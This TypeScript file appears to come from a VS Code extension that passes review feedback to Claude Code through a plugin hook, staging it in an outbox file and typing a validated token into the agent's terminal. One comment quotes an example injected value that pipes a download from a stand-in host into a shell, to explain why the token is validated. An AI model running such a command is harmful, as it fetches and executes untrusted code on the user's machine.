import * as fs from 'node:fs/promises';
import * as path from 'node:path';
import { touchedLogPath } from './touched';

/**
 * Handing a batch of feedback to Claude Code through the Redline plugin.
 *
 * Without the plugin, the whole prompt has to be typed into the agent's terminal. Several
 * kilobytes take a variable, unpredictable time to be ingested, which is what made pressing
 * Enter unreliable — a one-note batch submitted, a two-note batch sat in the input.
 *
 * With the plugin the prompt is written here and a short token is typed instead. The
 * plugin's `UserPromptSubmit` hook injects the feedback into the model's context and deletes
 * the file. A word typed into an agent's input survives where a page of prompt does not.
 */

/** What the hook records so this side can tell whether the plugin is installed and running. */
interface HookMarker {
  name?: string;
  version?: number;
  token?: string;
  at?: string;
}

/** Beyond this, the marker is a leftover from a plugin that is no longer in use. */
const MARKER_TTL_MS = 30 * 24 * 60 * 60 * 1000;

/** Default; the marker may name a different one, and the hook is the authority. */
export const DEFAULT_DELIVERY_TOKEN = 'redline-review';

/** The only shape a token may have: one short run of word characters and hyphens. */
const TOKEN_SHAPE = /^[\w-]{1,64}$/;

function stateDir(root: string, home?: string): string {
  return path.dirname(touchedLogPath(root, home));
}

/**
 * The token to type, or undefined when the plugin is not available here.
 *
 * Deliberately keyed on the hook having *run* rather than on a file existing: an installed
 * plugin that never fires is the same as no plugin, and quietly typing a token nothing will
 * expand would send the agent a meaningless word.
 */
export async function deliveryToken(root: string, home?: string): Promise<string | undefined> {
  try {
    const raw = await fs.readFile(path.join(stateDir(root, home), 'hook.json'), 'utf8');
    const marker = JSON.parse(raw) as HookMarker;
    if (marker.name !== 'redline') return undefined;
    const at = Date.parse(marker.at ?? '');
    if (!Number.isFinite(at) || Date.now() - at > MARKER_TTL_MS) return undefined;
    if (marker.token === undefined) return DEFAULT_DELIVERY_TOKEN;
    // `typeof` first: the marker is `JSON.parse`d, so its `token` is whatever was in the file,
    // and `RegExp.test` coerces — a numeric `42` matches the shape and is then returned as a
    // number, past a signature that promises a string, to be typed into a terminal.
    if (typeof marker.token !== 'string' || !TOKEN_SHAPE.test(marker.token)) {
      /*
       * Whatever comes back from here is typed into a terminal and, when auto-submit is on,
       * followed by Enter. The hook writes a token it says is "deliberately free of `@` and
       * `/`", but that promise is kept only at the point of writing: `~/.claude` is an
       * ordinary directory that any tool on this machine — this extension's own agent
       * included — can write, so a marker naming `"; curl evil | sh\n"` would be typed and
       * run. Validated where it is read, because that is the only place the shape can be
       * relied on. An unrecognisable token is no token: the batch falls back to the
       * clipboard, which is the same path as no plugin at all.
       */
      console.warn(`Redline: ignoring a hook marker whose delivery token is not a plain word (${root})`);
      return undefined;
    }
    return marker.token;
  } catch {
    return undefined;
  }
}

/** Whether the batch reached the outbox, or an uncollected one is already sitting in it. */
export type StageResult = 'staged' | 'occupied';

/**
 * Matches the hook's own `OUTBOX_TTL_MS`. Past it the hook deletes the file unread, so an
 * older outbox is not waiting for anyone and replacing it loses nothing.
 */
const OUTBOX_TTL_MS = 60 * 60 * 1000;

/**
 * Leave the feedback where the hook will find it.
 *
 * Written and then renamed into place: the hook could otherwise read a file that is still
 * being written and deliver half a review.
 *
 * There is one outbox per repository root and the hook empties it only when the token is
 * typed, so a second send before that — two VS Code windows on one repository, or one user
 * sending twice — used to write straight over a review nobody had collected. Both batches
 * showed "Staged" on their cards; only the later one existed. Refused instead, so the caller
 * can say which batch is still waiting rather than quietly discarding one.
 */
export async function stageForHandover(root: string, text: string, home?: string): Promise<StageResult> {
  const dir = stateDir(root, home);
  await fs.mkdir(dir, { recursive: true });
  const target = path.join(dir, 'outbox.md');
  try {
    const { mtimeMs } = await fs.stat(target);
    if (Date.now() - mtimeMs <= OUTBOX_TTL_MS) return 'occupied';
  } catch {
    // Nothing staged here, which is the normal case.
  }
  const temp = `${target}.tmp`;
  await fs.writeFile(temp, text, 'utf8');
  await fs.rename(temp, target);
  return 'staged';
}

/** Drop a staged batch that was never collected — a send that failed after staging. */
export async function discardHandover(root: string, home?: string): Promise<void> {
  try {
    await fs.rm(path.join(stateDir(root, home), 'outbox.md'), { force: true });
  } catch {
    // nothing staged
  }
}
